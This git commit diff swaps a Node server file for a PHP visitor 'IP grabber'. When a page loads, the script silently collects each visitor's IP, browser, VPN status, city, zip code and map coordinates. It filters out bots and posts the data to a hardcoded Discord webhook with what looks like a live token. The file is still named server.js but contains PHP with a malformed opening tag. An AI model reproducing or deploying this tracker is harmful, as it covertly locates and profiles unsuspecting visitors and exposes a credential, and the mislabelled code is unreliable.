cc393e1ea4c88aefc8bed205dba98f72d7351912
0T3 NoTrac3 <support@wintergate.org>
2025-05-21 06:27:50 -0700

    Update server.js

--- server.js
+++ server.js
@@ -1,27 +1,117 @@
-const express = require('express');
-const { WebhookClient } = require('discord.js');
+?php
 
-const app = express();
-const PORT = 3000;
+/* 
+Please keep this copyright statement intact
+Creator: Jeroenimo02#2380
+Publish Date: 19-03-2021
+Last Update: 18-03-2022
+APIs Provided By: geoiplookup.io and ip-api.com
+*/ 
 
-// Replace this with your actual webhook URL — only with proper authorization.
-const webhookClient = new WebhookClient({
-  url: 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token',
-});
+//Get the visitor's IP
+$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
+$Browser = $_SERVER['HTTP_USER_AGENT'];
 
-app.use(express.json());
+//Stop the bots from logging
+if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
+    exit();
+}
 
-app.get('/', (req, res) => {
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  
-  // Only log IPs if explicitly authorized for red team or testing purpose
-  webhookClient.send({
-    content: `🔍 Request received from IP: ${ip}`,
-  }).catch(console.error);
+//YOU CAN SET YOUR TIMEZONE HERE!
+date_default_timezone_set("Europe/Amsterdam");
+$Date = date('d/m/Y');
+$Time = date('G:i:s');
 
-  res.send('Hello! Your request was received.');
-});
+//Check if IP is a VPN (Is not always correct!)
+$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
+$VPNConn = json_decode(file_get_contents("https://json.geoiplookup.io/{$IP}"));
+if ($VPNConn->connection_type === "Corporate") {
+    $VPN = "Yes";
+} else {
+    $VPN = "No";
+}
 
-app.listen(PORT, () => {
-  console.log(`Server running at http://localhost:${PORT}`);
-});
+//Set some variables
+$Country = $Details->country;
+$CountryCode = $Details->countryCode;
+$Region = $Details->regionName;
+$City = $Details->city;
+$Zip = $Details->zip;
+$Lat = $Details->lat;
+$Lon = $Details->lon;
+$WebhookName = $IP;
+//Old method of getting a flag picture
+//$Flag = "https://www.countryflags.io/{$Details->countryCode}/flat/64.png";
+$Details->countryCode = strtolower($Details->countryCode);
+$FlagOLD = "https://raw.githubusercontent.com/stevenrskelton/flag-icon/master/png/75/country-4x3/{$Details->countryCode}.png";
+$Flag = "https://countryflagsapi.com/png/{$Details->countryCode}";
+
+
+class Discord
+{
+
+	//This will run and send as soon as the page loads
+    public function Visitor()
+    {
+        global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
+
+		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
+        $Webhook = "https://discord.com/api/webhooks/1373867976188756008/YsV-h95KrYtgAjJi2bZst4qzbcaTTZ57JZYESO3uPFVd-sivSXBJSYSJX1xyFhMzqtMg";
+
+        $InfoArr = array(
+            "username" => "$WebhookName",
+            "avatar_url" => "$Flag",
+            "embeds" => [array(
+
+                "title" => "Visitor From $Country",
+                "color" => "39423",
+
+                "fields" => [array(
+                    "name" => "IP",
+                    "value" => "$IP",
+                    "inline" => true
+                ),
+                    array(
+                        "name" => "VPN?",
+                        "value" => "$VPN",
+                        "inline" => true
+                    ),
+                    array(
+                        "name" => "Useragent",
+                        "value" => "$Browser"
+                    ),
+                    array(
+                        "name" => "Country/CountryCode",
+                        "value" => "$Country/$CountryCode",
+                        "inline" => true
+                    ),
+                    array(
+                        "name" => "Region | City | Zip",
+                        "value" => "[$Region | $City | $Zip](https://www.google.com/maps/search/?api=1&query=$Lat,$Lon 'Google Maps Location (+/- 750M Radius)')",
+                        "inline" => true
+                    )],
+
+                "footer" => array(
+                    "text" => "$Date $Time",
+					//Alarm-clock icon for the footer. You could also download the image and set the icon_url to the image path
+                    "icon_url" => "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
+                ),
+            )],
+        );
+
+		//Some code that sends the info as an embed to Discord
+        $JSON = json_encode($InfoArr);
+
+        $Curl = curl_init($Webhook);
+        curl_setopt($Curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+        curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
+        curl_setopt($Curl, CURLOPT_POSTFIELDS, $JSON);
+        curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
+		
+		//En voilà
+        return curl_exec($Curl);
+
+    }
+}
+
+?>
